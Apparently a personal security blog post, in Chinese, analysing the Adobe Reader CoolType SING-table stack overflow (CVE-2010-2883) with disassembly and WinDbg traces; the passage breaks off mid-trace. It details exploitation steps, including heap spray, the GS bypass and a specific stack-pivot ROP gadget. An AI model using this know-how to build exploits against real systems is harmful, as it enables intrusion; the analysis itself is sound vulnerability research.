<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">


























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=6.7.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=6.7.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=6.7.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '6.7.0',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="从备份失败的老博客还原出来的">
<meta name="keywords" content="old_blog,vuln">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2010-2883">
<meta property="og:url" content="https://vsane.github.io/2019/01/09/CVE-2010-2883/index.html">
<meta property="og:site_name" content="V4kst1z&#39;s Blog">
<meta property="og:description" content="从备份失败的老博客还原出来的">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2019-01-09T09:05:56.994Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2010-2883">
<meta name="twitter:description" content="从备份失败的老博客还原出来的">






  <link rel="canonical" href="https://vsane.github.io/2019/01/09/CVE-2010-2883/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>CVE-2010-2883 | V4kst1z's Blog</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">V4kst1z's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tag"></i> <br>Tags</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://vsane.github.io/2019/01/09/CVE-2010-2883/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="V4kst1z">
      <meta itemprop="description" content="Fighting">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="V4kst1z's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CVE-2010-2883

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-01-09 17:05:08 / Modified: 17:05:56" itemprop="dateCreated datePublished" datetime="2019-01-09T17:05:08+08:00">2019-01-09</time>
            

            
              

              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>从备份失败的老博客还原出来的<br><a id="more"></a></p>
<h2 id="漏洞概览"><a href="#漏洞概览" class="headerlink" title="漏洞概览"></a>漏洞概览</h2><p>本来想通过 <code>poc</code> 样本去定位漏洞地址，后来发现找的样本都无法定位到，感觉是我操作有问题，总是蹦出来异常处理，算了，就用泉哥用的上帝视角模式吧，直接通过漏洞点进行分析。<br>![QQ截图20180708170440.png-65.4kB][1]<br>漏洞点在<code>0x803ddab</code> 处，在调用 <code>strcat</code> 函数时没有对长度检查，造成溢出，并且有程序上下文可以猜测是在对字体处理时出现了问题。下面会详细分析这个漏洞是如何触发的，在分析之前需要先简单了解下 <code>pdf</code> 文件的结构，可以参考:<a href="https://zhuanlan.zhihu.com/p/30597307" target="_blank" rel="noopener">PDF文件解析与PDF恶代分析中的一些坑
</a></p>
<h2 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h2><p>我使用的样本是 <code>msf</code> 生成的可以弹出计算机的，原理都一样。先来了解下 <code>TTF</code> 字体的一些信息。<br>首先是 <code>tOffsetTable</code> 记录了表结构的信息，可以理解为一个总表吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tOffsetTable &#123;</span><br><span class="line">	TT_Fixed SFNT_Ver;	//sfnt version 0x00010000 for version 1.0. </span><br><span class="line">	USHORT  numTables;	//Number of tables.  </span><br><span class="line">	USHORT  searchRange;	//(Maximum power of 2 &lt;= numTables) x 16. </span><br><span class="line">	USHORT  entrySelector;	// Log2(maximum power of 2 &lt;= numTables). </span><br><span class="line">	USHORT  rangeShift;	// NumTables x 16-searchRange. </span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure></p>
<p>然后是 <code>tTable</code> 结构体，记录了相关表的偏移及大小。实际存储的时候会是一个数组，因为存了很多表，之后就是各个表的具体内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tTable &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">	char asChar[4];	// 4 -byte identifier. </span><br><span class="line">	ULONG asLong;</span><br><span class="line">	&#125; Tag;</span><br><span class="line">	ULONG checkSum;	// CheckSum for this table. </span><br><span class="line">	ULONG offset;	// Offset from beginning of TrueType font file. </span><br><span class="line">	ULONG length;	// Length of this table. </span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure></p>
<p>可以通过 <code>010editor</code> 的模板功能进行查看，如下(字体数据结构是通过 <code>PdfStreamDumper</code>得到的)<br>![20180708185531.png-27.6kB][2]<br><br><br><code>SING</code> 的结构如下图:<br>![singtbl.png-111.1kB][3]<br><br><br><br><br>下面我们看下实验的样本中 <code>SING</code> 结构的数据<br>![123.png-97.2kB][4]<br>我们先来简单分析下漏洞点附近的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">push    edi             ; int</span><br><span class="line">lea     ecx, [ebp+108h+var_12C]</span><br><span class="line">call    sub_8021B06</span><br><span class="line">mov     eax, [ebp+108h+var_12C]</span><br><span class="line">cmp     eax, esi</span><br><span class="line">mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">jz      short loc_803DDC4</span><br><span class="line">mov     ecx, [eax]</span><br><span class="line">and     ecx, 0FFFFh</span><br><span class="line">jz      short loc_803DD9F</span><br><span class="line">cmp     ecx, 100h</span><br><span class="line">jnz     short loc_803DDC0</span><br><span class="line">add     eax, 10h</span><br><span class="line">push    eax             ; char *</span><br><span class="line">lea     eax, [ebp+108h+var_108]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">mov     [ebp+108h+var_108], 0</span><br><span class="line">call    strcat</span><br></pre></td></tr></table></figure></p>
<p>先看第一个函数 <code>sub_8021B06(ecx, edi, str_SING);</code>, 第一个参数是一个对象，但是现在并不能确定这个函数的作用，可以通过 <code>windbg</code> 加断点比较前后数据的变化来猜测。<br>先看下在函数执行前<br>![QQ截图20180708194913.png-125.5kB][5]<br>执行函数后再一次进行比较，可以猜到函数的作用是根据存储 <code>TTF</code> 数据的地址找到 <code>SING</code> 表结构的地址。<br>![QQ截图20180708195541.png-139.6kB][6]<br>所以后面指令的作用基本就得到了，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">push    edi             ; int</span><br><span class="line">lea     ecx, [ebp+108h+var_12C]</span><br><span class="line">call    sub_8021B06      </span><br><span class="line">mov     eax, [ebp+108h+var_12C]           ;eax = SING addr   </span><br><span class="line">cmp     eax, esi</span><br><span class="line">mov     byte ptr [ebp+108h+var_10C], 2    </span><br><span class="line">jz      short loc_803DDC4       </span><br><span class="line">mov     ecx, [eax]                        ;version</span><br><span class="line">and     ecx, 0FFFFh              </span><br><span class="line">jz      short loc_803DD9F                 </span><br><span class="line">cmp     ecx, 100h           </span><br><span class="line">jnz     short loc_803DDC0                 </span><br><span class="line">add     eax, 10h                          ;SING+0x10 = SING-&gt;uniqueName</span><br><span class="line">push    eax             ; char *          ;uniqueName</span><br><span class="line">lea     eax, [ebp+108h+var_108]           ;stack addr</span><br><span class="line">push    eax             ; char *          </span><br><span class="line">mov     [ebp+108h+var_108], 0</span><br><span class="line">call    strcat</span><br></pre></td></tr></table></figure></p>
<p>所以现在漏洞很清晰啦，通过 <code>strcat</code> 函数将 <code>uniqueName</code> 的字符串来连接到栈地址，但是没有检查长度，造成溢出。<br>![eee.png-134.8kB][7]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char *strcat(char *dest, const char *src);</span><br></pre></td></tr></table></figure></p>
<p>虽然只是个栈溢出，但是因为软件过于复杂，并且还存在 <code>GS</code> 保护(虽然后面的利用 <code>GS</code> 没卵用)，所以利用起来难度还是很大的，至少对我这个菜鸡是这样，下面我们来看下是如何利用的。</p>
<h2 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h2><p>在 <code>strcat</code> 函数执行前查看帧栈信息，与执行后进行比较<br>![fff.png-179.6kB][8]<br>可以看到栈上的数据的改动造成了相关帧栈信息的变动，例如 <code>0x0c0c0c0c</code>,可以很自然的想到 <code>heapspray</code>。<br>实际上面代码还有个很无法理解的地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DCF9                 push    ebp</span><br><span class="line">.text:0803DCFA                 sub     esp, 104h</span><br><span class="line">.text:0803DD00                 lea     ebp, [esp-4]</span><br></pre></td></tr></table></figure></p>
<p>编译器这样改 <code>ebp</code> 是为了优化??? 不懂<br>后面的通过栈上的可控变量控制 <code>eip</code> 这一步感觉实在想不出来，感觉可能是通过污点分析对可控数据监控，当遇到能通过 <code>call</code> 调用时记录下来，然后利用的。在 <code>0x0808B308</code> 处的指令可以通过栈上存储的值调用相应地址的指令，通过 <code>windbg</code> 跟踪来看下。<br>![ggg.png-14.4kB][9]<br>跟踪直到运行到 <code>0808B308</code> 处，整理运行过的指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">0803ddb6 8bcb            mov     ecx,ebx</span><br><span class="line">0803ddb8 e88634fcff      call    CoolType+0x1243 (08001243)</span><br><span class="line">0803ddbd 8b45dc          mov     eax,dword ptr [ebp-24h] ss:0023:0012e4b4=046cb078</span><br><span class="line">0803ddc0 c645ef01        mov     byte ptr [ebp-11h],1       ss:0023:0012e4c7=00</span><br><span class="line">0803ddc4 3bc6            cmp     eax,esi</span><br><span class="line">0803ddc6 c645fc01        mov     byte ptr [ebp-4],1         ss:0023:0012e4d4=02</span><br><span class="line">0803ddca 7407            je      CoolType+0x3ddd3 (0803ddd3)             [br=0]</span><br><span class="line">0803ddcc 50              push    eax</span><br><span class="line">0803ddcd e8ed3a0000      call    CoolType+0x418bf (080418bf)</span><br><span class="line">0803ddd2 59              pop     ecx</span><br><span class="line">0803ddd3 807def00        cmp     byte ptr [ebp-11h],0       ss:0023:0012e4c7=01</span><br><span class="line">0803ddd7 0f85cc000000    jne     CoolType+0x3dea9 (0803dea9)             [br=1]</span><br><span class="line">0803dea9 8d45e4          lea     eax,[ebp-1Ch]</span><br><span class="line">0803deac 50              push    eax</span><br><span class="line">0803dead 53              push    ebx</span><br><span class="line">0803deae 57              push    edi</span><br><span class="line">0803deaf e82a8dfdff      call    CoolType+0x16bde (08016bde)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">08016bde 55              push    ebp</span><br><span class="line">08016bdf 81ec60060000    sub     esp,660h</span><br><span class="line">08016be5 8d6c24fc        lea     ebp,[esp-4]</span><br><span class="line">08016be9 a1b80f2308      mov     eax,dword ptr [CoolType!CTCleanup+0xe26ee (08230fb8)] ds:0023:08230fb8=67fbe93a</span><br><span class="line">08016bee 33c5            xor     eax,ebp</span><br><span class="line">08016bf0 898560060000    mov     dword ptr [ebp+660h],eax ss:0023:0012e458=0012e4cc</span><br><span class="line">08016bf6 6a50            push    50h</span><br><span class="line">08016bf8 b8325d1708      mov     eax,offset CoolType!CTCleanup+0x27468 (08175d32)</span><br><span class="line">08016bfd e8cf150300      call    CoolType!CTInit+0x1b2e (080481d1)</span><br><span class="line">08016c02 8b8574060000    mov     eax,dword ptr [ebp+674h] ss:0023:0012e46c=0012e4bc</span><br><span class="line">08016c08 8bb570060000    mov     esi,dword ptr [ebp+670h] ss:0023:0012e468=0012e608</span><br><span class="line">08016c0e 8bbd6c060000    mov     edi,dword ptr [ebp+66Ch] ss:0023:0012e464=0012e718</span><br><span class="line">08016c14 8945a8          mov     dword ptr [ebp-58h],eax ss:0023:0012dda0=ffeb0000</span><br><span class="line">08016c17 b850a62308      mov     eax,offset CoolType!CTCleanup+0xebd86 (0823a650)</span><br><span class="line">08016c1c 50              push    eax</span><br><span class="line">08016c1d 8975e4          mov     dword ptr [ebp-1Ch],esi ss:0023:0012dddc=1200b8e7</span><br><span class="line">08016c20 8945a4          mov     dword ptr [ebp-5Ch],eax ss:0023:0012dd9c=00000001</span><br><span class="line">08016c23 ff1530f11808    call    dword ptr [CoolType!CTCleanup+0x40866 (0818f130)] ds:0023:0818f130=&#123;ntdll!RtlEnterCriticalSection (7c921000)&#125;</span><br><span class="line">08016c29 33db            xor     ebx,ebx</span><br><span class="line">08016c2b 57              push    edi</span><br><span class="line">08016c2c 895dfc          mov     dword ptr [ebp-4],ebx ss:0023:0012ddf4=ffffffff</span><br><span class="line">08016c2f 895dd0          mov     dword ptr [ebp-30h],ebx ss:0023:0012ddc8=1200b8e7</span><br><span class="line">08016c32 895dec          mov     dword ptr [ebp-14h],ebx ss:0023:0012dde4=81234378</span><br><span class="line">08016c35 e8e24e0000      call    CoolType+0x1bb1c (0801bb1c)</span><br><span class="line">08016c3a 3bc3            cmp     eax,ebx</span><br><span class="line">08016c3c 59              pop     ecx</span><br><span class="line">08016c3d 8945e8          mov     dword ptr [ebp-18h],eax ss:0023:0012dde0=8d235d88</span><br><span class="line">08016c40 0f8488060000    je      CoolType+0x172ce (080172ce)             [br=0]</span><br><span class="line">08016c46 6a01            push    1</span><br><span class="line">08016c48 53              push    ebx</span><br><span class="line">08016c49 53              push    ebx</span><br><span class="line">08016c4a 8d45ec          lea     eax,[ebp-14h]</span><br><span class="line">08016c4d 50              push    eax</span><br><span class="line">08016c4e 8d45d0          lea     eax,[ebp-30h]</span><br><span class="line">08016c51 50              push    eax</span><br><span class="line">08016c52 57              push    edi</span><br><span class="line">08016c53 ff75e8          push    dword ptr [ebp-18h]  ss:0023:0012dde0=01efc87c</span><br><span class="line">08016c56 e8c64e0000      call    CoolType+0x1bb21 (0801bb21)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0801bb21 55              push    ebp</span><br><span class="line">0801bb22 8bec            mov     ebp,esp</span><br><span class="line">0801bb24 ff7520          push    dword ptr [ebp+20h]  ss:0023:0012dd88=00000001</span><br><span class="line">0801bb27 8b4d08          mov     ecx,dword ptr [ebp+8] ss:0023:0012dd70=01efc87c</span><br><span class="line">0801bb2a ff751c          push    dword ptr [ebp+1Ch]  ss:0023:0012dd84=00000000</span><br><span class="line">0801bb2d 8b01            mov     eax,dword ptr [ecx]  ds:0023:01efc87c=081a601c</span><br><span class="line">0801bb2f ff7518          push    dword ptr [ebp+18h]  ss:0023:0012dd80=00000000</span><br><span class="line">0801bb32 ff05a0a62308    inc     dword ptr [CoolType!CTCleanup+0xebdd6 (0823a6a0)] ds:0023:0823a6a0=00000000</span><br><span class="line">0801bb38 ff7514          push    dword ptr [ebp+14h]  ss:0023:0012dd7c=0012dde4</span><br><span class="line">0801bb3b ff7510          push    dword ptr [ebp+10h]  ss:0023:0012dd78=0012ddc8</span><br><span class="line">0801bb3e ff750c          push    dword ptr [ebp+0Ch]  ss:0023:0012dd74=0012e718</span><br><span class="line">0801bb41 ff10            call    dword ptr [eax]      ds:0023:081a601c=0808b116</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0808b116 55              push    ebp</span><br><span class="line">0808b117 8bec            mov     ebp,esp</span><br><span class="line">0808b119 51              push    ecx</span><br><span class="line">0808b11a 53              push    ebx</span><br><span class="line">0808b11b 56              push    esi</span><br><span class="line">0808b11c 57              push    edi</span><br><span class="line">0808b11d 8b7d08          mov     edi,dword ptr [ebp+8] ss:0023:0012dd50=0012e718</span><br><span class="line">0808b120 57              push    edi</span><br><span class="line">0808b121 8bf1            mov     esi,ecx</span><br><span class="line">0808b123 e802ffffff      call    CoolType!CTInit+0x44987 (0808b02a)</span><br><span class="line">0808b128 33db            xor     ebx,ebx</span><br><span class="line">0808b12a 84c0            test    al,al</span><br><span class="line">0808b12c 0f8499010000    je      CoolType!CTInit+0x44c28 (0808b2cb)      [br=0]</span><br><span class="line">0808b132 385d1c          cmp     byte ptr [ebp+1Ch],bl      ss:0023:0012dd64=01</span><br><span class="line">0808b135 0f8590010000    jne     CoolType!CTInit+0x44c28 (0808b2cb)      [br=1]</span><br><span class="line">0808b2cb 8b06            mov     eax,dword ptr [esi]  ds:0023:01efc87c=081a601c</span><br><span class="line">0808b2cd 885d1f          mov     byte ptr [ebp+1Fh],bl      ss:0023:0012dd67=00</span><br><span class="line">0808b2d0 ff5070          call    dword ptr [eax+70h]  ds:0023:081a608c=08089937</span><br><span class="line">0808b2d3 57              push    edi</span><br><span class="line">0808b2d4 8d4e14          lea     ecx,[esi+14h]</span><br><span class="line">0808b2d7 e86432f9ff      call    CoolType+0x1e540 (0801e540)</span><br><span class="line">0808b2dc c686e000000001  mov     byte ptr [esi+0E0h],1      ds:0023:01efc95c=00</span><br><span class="line">0808b2e3 8b473c          mov     eax,dword ptr [edi+3Ch] ds:0023:0012e754=0012e6d0</span><br><span class="line">0808b2e6 3bc3            cmp     eax,ebx</span><br><span class="line">0808b2e8 8986f4020000    mov     dword ptr [esi+2F4h],eax ds:0023:01efcb70=0012e6d0</span><br><span class="line">0808b2ee 899ef8020000    mov     dword ptr [esi+2F8h],ebx ds:0023:01efcb74=00000000</span><br><span class="line">0808b2f4 895dfc          mov     dword ptr [ebp-4],ebx ss:0023:0012dd44=01efc87c</span><br><span class="line">0808b2f7 7507            jne     CoolType!CTInit+0x44c5d (0808b300)      [br=1]</span><br><span class="line">0808b300 8d4dfc          lea     ecx,[ebp-4]</span><br><span class="line">0808b303 51              push    ecx</span><br><span class="line">0808b304 53              push    ebx</span><br><span class="line">0808b305 6a03            push    3</span><br><span class="line">0808b307 50              push    eax</span><br><span class="line">0808b308 ff10            call    dword ptr [eax]      ds:0023:0012e6d0=4a80cb38</span><br></pre></td></tr></table></figure></p>
<p>下面来看下 <code>call    dword ptr [eax]</code> 会执行什么指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r eax </span><br><span class="line">eax=0012e6d0</span><br><span class="line">0:000&gt; dd 0012e6d0 L1</span><br><span class="line">0012e6d0  4a80cb38</span><br><span class="line">0:000&gt; !address 4a80cb38</span><br><span class="line">*************************************************************************</span><br><span class="line">Usage:                  Image</span><br><span class="line">Allocation Base:        4a800000</span><br><span class="line">Base Address:           4a801000</span><br><span class="line">End Address:            4a849000</span><br><span class="line">Region Size:            00048000</span><br><span class="line">Type:                   01000000	MEM_IMAGE</span><br><span class="line">State:                  00001000	MEM_COMMIT</span><br><span class="line">Protect:                00000020	PAGE_EXECUTE_READ</span><br><span class="line">More info:              lmv m icucnv36</span><br><span class="line">More info:              !lmi icucnv36</span><br><span class="line">More info:              ln 0x4a80cb38</span><br><span class="line">0:000&gt; u 4a80cb38</span><br><span class="line">icucnv36!ucnv_toUChars_3_6+0x162:</span><br><span class="line">4a80cb38 81c594070000    add     ebp,794h</span><br><span class="line">4a80cb3e c9              leave</span><br><span class="line">4a80cb3f c3              ret</span><br></pre></td></tr></table></figure></p>
<p>所以 <code>icucnv36!ucnv_toUChars_3_6+0x162</code> 处的 <code>gadget</code> 的作用就很明显了， <code>stack pivot</code>。单步执行看下下一个 <code>gadget</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r ebp</span><br><span class="line">ebp=0012dd48</span><br><span class="line">0:000&gt; dd ebp</span><br><span class="line">0012dd48  0012dd68 0801bb43 0012e718 0012ddc8</span><br><span class="line">0012dd58  0012dde4 00000000 00000000 00000001</span><br><span class="line">0012dd68  0012ddf8 08016c5b 01efc87c 0012e718</span><br><span class="line">0012dd78  0012ddc8 0012dde4 00000000 00000000</span><br><span class="line">0012dd88  00000001 67e934c2 0012e718 00000000</span><br><span class="line">0012dd98  0012e608 0823a650 0012e4bc ff270000</span><br><span class="line">0012dda8  00000003 1200ccdd 81234378 1200b8e7</span><br><span class="line">0012ddb8  120058e8 1200b8e7 8d235d88 120034de</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a80cb3e esp=0012dd24 ebp=0012e4dc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202</span><br><span class="line">icucnv36!ucnv_toUChars_3_6+0x168:</span><br><span class="line">4a80cb3e c9              leave</span><br><span class="line">0:000&gt; dd ebp</span><br><span class="line">0012e4dc  f012512c 4a82a714 0c0c0c0c 47dabcf2</span><br><span class="line">0012e4ec  5c064f94 5c53850a 57ef3bba e910375e</span><br><span class="line">0012e4fc  ef4039c2 f0e3b6aa 61a8c5b4 c2474a7a</span><br><span class="line">0012e50c  15da11a6 436a7060 1d9d4505 1c1f88da</span><br><span class="line">0012e51c  249ca0df e4d40d46 269a3dfc daed6b97</span><br><span class="line">0012e52c  c920c5fc 2d4265c3 cb1f5a53 5a0c27e0</span><br><span class="line">0012e53c  